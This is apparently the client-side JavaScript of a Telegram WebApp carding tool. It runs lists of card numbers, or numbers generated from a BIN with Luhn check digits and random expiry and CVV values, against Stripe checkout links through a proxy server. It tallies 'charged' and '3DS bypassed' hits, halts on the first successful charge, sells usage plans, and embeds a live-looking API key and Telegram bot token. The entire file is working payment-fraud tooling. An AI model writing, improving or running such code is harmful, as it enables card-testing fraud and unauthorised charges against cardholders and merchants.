// Telegram WebApp Initialization
const tg = window.Telegram?.WebApp;
if (tg) {
    tg.expand();
    tg.ready();
    tg.MainButton.hide();
}

// State
let activeGate = 'checkout';
let activeMode = 'cards';
let isHitting = false;
let currentOtp = null;
let currentChatId = null;
let analyzedData = { site: null, amount: null };

const API_KEY = 'hitchk_af1343a64a30cdec968d3c3228c7cf023ab5948e453183d9';
const API_URL = 'https://hitter1month.replit.app';
const NOTIFY_BOT_TOKEN = '8680374467:AAEcO6m-O6BOQD0mec7cyURfqQ8Ax2bphkk';
const NOTIFY_CHAT_ID = '-1003721268860';

let userPlan = 'free';
let remainingHits = 0;
let maxHits = 2;

// Authentication Check
async function checkAuth() {
    // Auto-fill Chat ID from Telegram WebApp if available
    if (tg?.initDataUnsafe?.user?.id) {
        const loginChatIdInput = document.getElementById('loginChatId');
        if (loginChatIdInput && !loginChatIdInput.value) {
            loginChatIdInput.value = tg.initDataUnsafe.user.id;
        }
    }

    if (localStorage.getItem('isLoggedIn') === 'true') {
        const chatId = localStorage.getItem('userChatId');
        currentChatId = chatId;
        
        try {
            // Capture referral ID from Telegram start_param
            const referrerId = tg?.initDataUnsafe?.start_param || null;

            // Sync User Info from Server
            const res = await fetch('/get-user-info', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chatId, referrerId })
            });
            const data = await res.json();
            userPlan = data.plan;
            remainingHits = data.plan === 'free' ? (data.maxHits - data.hitsToday) : 'Unlimited';
            maxHits = data.maxHits;

            document.getElementById('loginOverlay').classList.add('hidden');
            document.getElementById('app').classList.remove('blur');
            updateUIWithPlan();

            // Sync Telegram Profile in Tool Page
            if (tg?.initDataUnsafe?.user) {
                const user = tg.initDataUnsafe.user;
                const fullName = (user.first_name + ' ' + (user.last_name || '')).trim();
                document.getElementById('userName').innerText = fullName;
                document.getElementById('userChatIdDisplay').innerText = `ID: ${user.id}`;
                
                const picDiv = document.getElementById('userPic');
                if (user.photo_url) {
                    picDiv.innerHTML = `<img src="${user.photo_url}" style="width:100%;height:100%;border-radius:50%">`;
                } else {
                    picDiv.innerText = user.first_name.charAt(0).toUpperCase();
                }
            }
        } catch (e) {
            console.error('Auth sync failed', e);
        }
    }
}
window.onload = checkAuth;

function updateUIWithPlan() {
    const statusText = document.getElementById('planStatusText');
    const badgeText = document.getElementById('headerPlanBadge');
    
    if (statusText) {
        statusText.innerText = `Plan: ${userPlan.toUpperCase()} | Hits Left: ${remainingHits}`;
    }
    if (badgeText) {
        badgeText.innerText = userPlan.toUpperCase();
    }
    
    // Update hit button if limit reached
    if (userPlan === 'free' && remainingHits <= 0) {
        document.getElementById('hitBtnText').innerText = 'Limit Reached - Upgrade';
    }
}

// Logout Logic
function logout() {
    localStorage.removeItem('isLoggedIn');
    localStorage.removeItem('userChatId');
    location.reload();
}

// Send OTP via Server
document.getElementById('sendOtpBtn').addEventListener('click', async () => {
    const chatId = document.getElementById('loginChatId').value.trim();
    if (!chatId) { alert('Please enter your Chat ID'); return; }

    currentChatId = chatId;

    const btn = document.getElementById('sendOtpBtn');
    btn.disabled = true;
    btn.innerText = 'Sending...';

    try {
        const resp = await fetch('/send-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chatId })
        });

        const data = await resp.json();
        if (resp.ok) {
            document.getElementById('loginStep1').classList.add('hidden');
            document.getElementById('loginStep2').classList.remove('hidden');
            if (tg) tg.HapticFeedback.notificationOccurred('success');
        } else {
            alert(data.error || 'Failed to send OTP.');
        }
    } catch (err) {
        alert('Failed to send code. Check your internet.');
    } finally {
        btn.disabled = false;
        btn.innerText = 'Send Verification Code';
    }
});

// Verify OTP via Server
document.getElementById('verifyOtpBtn').addEventListener('click', async () => {
    const code = document.getElementById('loginCode').value.trim();
    const referrerId = tg?.initDataUnsafe?.start_param || null;

    if (!code) return alert('Enter the code');

    try {
        const response = await fetch('/verify-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chatId: currentChatId, code, referrerId })
        });
        
        const data = await response.json();
        if (response.ok) {
             // Final registration/sync
            await fetch('/get-user-info', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chatId: currentChatId, referrerId })
            });

            localStorage.setItem('isLoggedIn', 'true');
            localStorage.setItem('userChatId', currentChatId);
            
            document.getElementById('loginOverlay').classList.add('hidden');
            document.getElementById('app').classList.remove('blur');
            
            if (tg) {
                tg.HapticFeedback.notificationOccurred('success');
                tg.showPopup({ message: 'Login Successful!' });
            }
            checkAuth();
        } else {
            alert(data.error || 'Invalid Code');
        }
    } catch (err) {
        alert('Server connection lost');
    }
});

// DOM Elements
const gateTabs = document.querySelectorAll('.gate-tab');
const modeBtns = document.querySelectorAll('.mode-btn');
const cardsInputSection = document.getElementById('cardsInputSection');
const binInputSection = document.getElementById('binInputSection');
const hitBtn = document.getElementById('hitBtn');
const hitBtnText = document.getElementById('hitBtnText');
const resultsList = document.getElementById('resultsList');
const successCard = document.getElementById('successCard');

// Stats Elements
const statTotal = document.getElementById('statTotal');
const statCharged = document.getElementById('statCharged');
const statBypassed = document.getElementById('statBypassed');

// Link Preview Elements
const targetUrlInput = document.getElementById('targetUrl');
const linkPreview = document.getElementById('linkPreview');
const previewStatus = document.getElementById('previewStatus');
const previewData = document.getElementById('previewData');
const previewSiteName = document.getElementById('previewSiteName');
const previewAmount = document.getElementById('previewAmount');

let stats = { total: 0, charged: 0, bypassed: 0 };
let chargedCards = [];

// Tab Switching
gateTabs.forEach(tab => {
    tab.addEventListener('click', () => {
        gateTabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        activeGate = tab.dataset.gate;
        if (tg) tg.HapticFeedback.selectionChanged();
    });
});

// Mode Switching
document.getElementById('modeCards').addEventListener('click', (e) => switchMode('cards', e.target));
document.getElementById('modeBin').addEventListener('click', (e) => switchMode('bin', e.target));

function switchMode(mode, btn) {
    activeMode = mode;
    modeBtns.forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    
    if (mode === 'cards') {
        cardsInputSection.classList.remove('hidden');
        binInputSection.classList.add('hidden');
    } else {
        cardsInputSection.classList.add('hidden');
        binInputSection.classList.remove('hidden');
    }
    if (tg) tg.HapticFeedback.selectionChanged();
}

// Analysis Logic
async function analyzeLink(url) {
    if (!url) {
        linkPreview.classList.add('hidden');
        return;
    }

    // Support custom domains like billing.gamma.app or any hosted Stripe path
    const isStripeURL = url.includes('stripe.com') || 
                       url.includes('/c/pay/') || 
                       url.includes('/billing/') || 
                       url.includes('/invoice/') || 
                       url.includes('/p/session/');

    if (!isStripeURL) {
        linkPreview.classList.add('hidden');
        return;
    }

    linkPreview.classList.remove('hidden');
    previewStatus.innerText = '🔍 Analyzing Link...';
    previewData.classList.remove('hidden'); // Always show boxes for manual entry
    
    // Default values if analysis hasn't finished
    previewSiteName.innerText = 'Analyzing...';
    previewAmount.innerText = 'Analyzing...';
    analyzedData = { site: 'Stripe Checkout', amount: 'Unknown' };

    try {
        const response = await fetch('/analyze-link', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ url })
        });

        if (response.ok) {
            const data = await response.json();
            analyzedData = data;
            
            previewStatus.innerText = '✅ Link Analysis Complete (Click to Edit)';
            previewSiteName.innerText = data.site;
            previewAmount.innerText = data.amount;
        } else {
            previewStatus.innerText = '❌ Click to Manual Input (Analysis Blocked)';
            previewSiteName.innerText = 'Stripe Checkout';
            previewAmount.innerText = 'Unknown';
        }
    } catch (err) {
        previewStatus.innerText = '⚠️ Click to Manual Input (Network Error)';
        previewSiteName.innerText = 'Stripe Checkout';
        previewAmount.innerText = 'Unknown';
    }
}

targetUrlInput.addEventListener('input', (e) => {
    const url = e.target.value.trim();
    // Debounce analysis a bit
    clearTimeout(targetUrlInput.timeout);
    targetUrlInput.timeout = setTimeout(() => analyzeLink(url), 500);
});

// Manual Override Logic
previewSiteName.parentElement.onclick = () => {
    const newName = prompt('Enter Site Name:', previewSiteName.innerText);
    if (newName) {
        previewSiteName.innerText = newName;
        analyzedData.site = newName;
    }
};

previewAmount.parentElement.onclick = () => {
    const newAmount = prompt('Enter Amount (e.g. 20.00 USD):', previewAmount.innerText);
    if (newAmount) {
        previewAmount.innerText = newAmount;
        analyzedData.amount = newAmount;
    }
};

// BIN Generation Logic
function generateLuhnCheckDigit(number) {
    let sum = 0;
    let shouldDouble = true;
    for (let i = number.length - 1; i >= 0; i--) {
        let digit = parseInt(number.charAt(i));
        if (shouldDouble) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
    }
    return (10 - (sum % 10)) % 10;
}

function generateCardsFromBin(bin, qty) {
    const cards = [];
    const cleanBin = bin.replace(/\D/g, '');
    
    // Detect Card Type Length
    // Amex (34, 37) = 15 digits
    // Others = 16 digits
    const isAmex = cleanBin.startsWith('34') || cleanBin.startsWith('37');
    const targetLength = isAmex ? 15 : 16;
    const baseLength = targetLength - 1;

    for (let i = 0; i < qty; i++) {
        let cardBase = cleanBin;
        while (cardBase.length < baseLength) {
            cardBase += Math.floor(Math.random() * 10);
        }
        // If the BIN is already longer than baseLength, truncate it to baseLength
        if (cardBase.length > baseLength) {
            cardBase = cardBase.substring(0, baseLength);
        }

        const checkDigit = generateLuhnCheckDigit(cardBase);
        const cardNum = cardBase + checkDigit;
        
        const mm = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
        const yy = Math.floor(Math.random() * (2032 - 2025) + 2025).toString().slice(-2);
        const cvv = String(Math.floor(Math.random() * 900) + 100);
        cards.push(`${cardNum}|${mm}|${yy}|${cvv}`);
    }
    return cards;
}

// Hitting Logic
hitBtn.addEventListener('click', async () => {
    // If already hitting, this button acts as 'STOP'
    if (isHitting) {
        isHitting = false;
        hitBtn.classList.remove('stop-btn');
        hitBtnText.innerText = 'Stopping...';
        return;
    }

    const url = document.getElementById('targetUrl').value.trim();
    if (!url) {
        alert('Please enter a target URL');
        return;
    }

    let cards = [];
    if (activeMode === 'cards') {
        const raw = document.getElementById('cardsTextarea').value.trim();
        cards = raw.split('\n').filter(c => c.trim().length > 0);
    } else {
        const bin = document.getElementById('binNumber').value.trim();
        const qty = parseInt(document.getElementById('binQuantity').value) || 10;
        if (!bin) { alert('Please enter a BIN'); return; }
        cards = generateCardsFromBin(bin, qty);
    }

    if (cards.length === 0) {
        alert('No cards to process');
        return;
    }

    // Start Process
    isHitting = true;
    hitBtn.classList.add('stop-btn');
    hitBtn.disabled = true; // Physical lock
    hitBtnText.innerText = 'STOP';
    resultsList.innerHTML = '';
    
    // Reset Stats
    stats = { total: 0, charged: 0, bypassed: 0 };
    chargedCards = []; // Important: Clear success list too
    updateStatsUI();
    successCard.classList.add('hidden');

    for (let i = 0; i < cards.length; i++) {
        // Break loop if STOP was clicked
        if (!isHitting) break;

        // Check Limit Again (Real-time)
        if (userPlan === 'free' && remainingHits <= 0) {
            showLimitModal('Daily limit reached! Please upgrade your plan.');
            break;
        }

        const card = cards[i];
        const startTime = Date.now();
        
        try {
            // PROXY HIT through our server
            const response = await fetch(`/hit-proxy/${activeGate}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chatId: currentChatId,
                    url: url,
                    card: card,
                    userName: document.getElementById('userName').innerText || 'User',
                    site: analyzedData.site,
                    amount: analyzedData.amount
                })
            });

            const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
            const result = await response.json().catch(() => ({}));

            // ALWAYS update local hit count if returned from server
            if (userPlan === 'free' && result.remainingHits !== undefined) {
                remainingHits = result.remainingHits;
                updateUIWithPlan();
            }

            if (!response.ok) {
                if (response.status === 403) {
                    showLimitModal(result.message || 'Limit Reached');
                    isHitting = false;
                    break;
                }
                injectLog(card, 'error', result.message || 'System Error', elapsed);
                continue;
            }

            processHitResult(card, result, elapsed, i + 1, cards.length);

            // STOP IMMEDIATELY if hit is successful
            if (result.status === 'charged' || result.status === 'approved') {
                isHitting = false;
                break; 
            }
        } catch (err) {
            console.error(err);
            const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
            injectLog(card, 'error', `Network/CORS Error: ${err.message}`, elapsed);
        }
    }

    isHitting = false;
    hitBtn.classList.remove('stop-btn');
    hitBtn.disabled = false; // Release lock
    hitBtnText.innerText = 'Start Hitting';
    if (tg && tg.HapticFeedback && stats.charged > 0) tg.HapticFeedback.notificationOccurred('success');
});

function processHitResult(card, res, elapsed, count, total) {
    const status = res.status || 'dead';
    const message = res.message || res.error || (res.status ? `Status: ${res.status}` : 'No response message');
    
    stats.total++;
    
    if (status === 'charged' || status === 'approved') {
        stats.charged++;
        chargedCards.push(card);
        showSuccessCard(card, res, count, total);
        if (tg) tg.HapticFeedback.notificationOccurred('success');
    } else if (status === '3ds_bypassed' || status === 'live') {
        stats.bypassed++;
    }

    injectLog(card, status, message, elapsed, res.bypassed_3ds);
    updateStatsUI();
}

function updateStatsUI() {
    statTotal.innerText = `${stats.total} total`;
    statCharged.innerText = `${stats.charged} Charged`;
    statBypassed.innerText = `${stats.bypassed} 3DS Bypassed`;
}

function showSuccessCard(card, res, count, total) {
    successCard.classList.remove('hidden');
    document.getElementById('successAmount').innerText = res.amount || analyzedData.amount || 'Unknown';
    document.getElementById('successSite').innerText = res.site || analyzedData.site || 'Stripe Checkout';
    document.getElementById('successCardNum').innerText = maskCard(card);
    document.getElementById('successAttempts').innerText = `${count} / ${total}`;
}

function maskCard(card) {
    const parts = card.split('|');
    const num = parts[0];
    if (num.length < 10) return card;
    return `${num.substring(0,6)}******${num.substring(num.length-4)}|${parts[1]}|${parts[2]}|${parts[3]}`;
}

function injectLog(card, status, message, elapsed, bypassed3ds = false) {
    const isSuccess = (status === 'charged' || status === 'approved');
    const statusClass = isSuccess ? 'success' : 'decline';
    
    const div = document.createElement('div');
    div.className = 'log-item';
    
    div.innerHTML = `
        <div class="log-main">
            <span class="log-card">${maskCard(card)}</span>
            <span class="log-time">${elapsed}s</span>
        </div>
        <div class="log-status ${statusClass}">
            ${status === 'charged' ? '<i class="fas fa-shield-check"></i> ' : ''}
            ${message}
            ${bypassed3ds ? '<span class="log-badge bypassed">3DS BYPASSED</span>' : ''}
        </div>
    `;
    
    resultsList.prepend(div);
}

function showLimitModal(msg) {
    const modal = document.getElementById('limitModal');
    const msgEl = document.getElementById('limitModalMsg');
    if (modal && msgEl) {
        msgEl.innerText = msg || 'You have used your free hits for today.';
        modal.classList.remove('hidden');
    } else {
        alert(msg || 'Limit Reached'); // Fallback if modal missing
    }
}


// Copy Charged
document.getElementById('copyBtn').addEventListener('click', () => {
    if (chargedCards.length === 0) return;
    const text = chargedCards.join('\n');
    navigator.clipboard.writeText(text).then(() => {
        alert('Charged cards copied to clipboard!');
    });
});
